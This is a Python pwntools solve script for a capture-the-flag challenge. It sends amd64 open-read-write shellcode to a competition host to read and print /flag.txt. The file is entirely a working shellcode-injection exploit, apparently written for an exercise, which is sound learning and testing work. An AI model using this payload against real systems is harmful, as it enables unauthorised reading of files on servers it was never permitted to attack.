from pwn import *

context.arch = 'amd64'

HOST = "shellfour.pwn.ccit25.chals.havce.it"
PORT = 1340

r = remote(HOST, PORT)

shellcode = asm('''
    /* openat(AT_FDCWD, "/flag.txt", O_RDONLY) */
    mov     rax, 257           /* syscall: openat */
    mov     rdi, -100          /* AT_FDCWD */
    lea     rsi, [rip+filename]/* pt a "flag.txt" */
    xor     rdx, rdx           /* == 0 --> RDONLY */
    syscall

    /* read(fd, rsp, 100) */
    mov     rdi, rax           /* file descriptor */
    mov     rsi, rsp           /* buffer: stack */
    mov     rdx, 100           /* max = 100 */
    xor     rax, rax           /* == 0 --> read */
    syscall

    /* write(1, rsp, 100) */
    mov     rdi, 1             /* stdout */
    mov     rax, 1             /* ==1 --> write */
    syscall

filename:
    .ascii "/flag.txt"
''')

print(f"{len(shellcode)}")
r.send(shellcode)
print(r.recvall().decode(errors= 'ignore'))
